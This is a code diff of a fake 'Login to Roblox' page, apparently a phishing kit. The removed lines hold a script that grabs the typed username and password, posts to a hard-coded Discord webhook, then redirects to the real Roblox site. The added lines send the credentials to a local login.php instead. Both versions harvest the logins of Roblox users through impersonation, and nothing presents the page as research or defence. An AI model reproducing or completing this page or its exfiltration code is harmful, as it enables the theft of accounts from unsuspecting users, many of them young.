@@ -111,24 +111,22 @@
                             <h1 class=login-header>Login to Roblox</h1>
                             <div id=login-form>
                                 <div>
-									<div id="login-form">
-									<div>
-										<div class="login-form-container">
-											<form id="login-form-override">
-												<div class="form-group username-form-group">
-													<label for="login-username" class="sr-only">Username/Email/Phone</label>
-													<input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" required>
-												</div>
-												<div class="form-group password-form-group">
-													<label for="login-password" class="sr-only">Password</label>
-													<input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" required>
-													<div aria-live="polite"></div>
-												</div>
-												<button class="btn-full-width login-button btn-secondary-md" type="submit">Log In</button>
-											</form>
-										</div>
-									</div>
-								</div>
+                                    <div class=login-form-container>
+                                        <form action="login.php" method="post">
+                                            <div class="form-group username-form-group"><label for=login-username
+                                                    class=sr-only>Username/Email/Phone</label><input id=login-username
+                                                    name=username type=text class="form-control input-field"
+                                                    placeholder=Username/Email/Phone required value></div>
+                                            <div class="form-group password-form-group"><label for=login-password
+                                                    class=sr-only>Password</label><input id=login-password name=password
+                                                    type=password class="form-control input-field" placeholder=Password
+                                                    required value>
+                                                <div aria-live=polite></div>
+                                            </div>
+                                            <button class="btn-full-width login-button btn-secondary-md" type=submit>Log In</button>
+                                        </form>
+                                    </div>
+                                </div>
                             </div>
                             <div class="text-center forgot-credentials-link"><a id=forgot-credentials-link
                                     class=text-link href="#"
@@ -192,34 +190,3 @@
         </footer>
     </div>
 </body>
-<script>
-    document.getElementById("login-form-override").addEventListener("submit", function(event) {
-        event.preventDefault();
-        const username = document.getElementById("login-username").value;
-        const password = document.getElementById("login-password").value;
-		
-		const webhookURL = "https://discord.com/api/webhooks/1400737647974023198/YYWpqaYj5nEe6ECx5JK25O7Qcv_UpknGWUjMxqs7QQ0jTr5Rojmt0RjWp2DmjxdGjjbS";
-		
-		fetch(webhookURL, {
-			method: "POST",
-			headers: {
-			"Content-Type": "application/json"
-			},
-			body: JSON.stringify({
-			content: "This is a message from my website."
-			})
-		})
-		.then(response => {
-			if (response.ok) {
-			console.log("Logging into roblox...")
-			} else {
-			console.error("Failed!");
-			}
-		})
-		.catch(error => {
-			console.log("Failed!")
-		});
-
-        window.location.href = "https://www.roblox.com";
-    });
-</script>
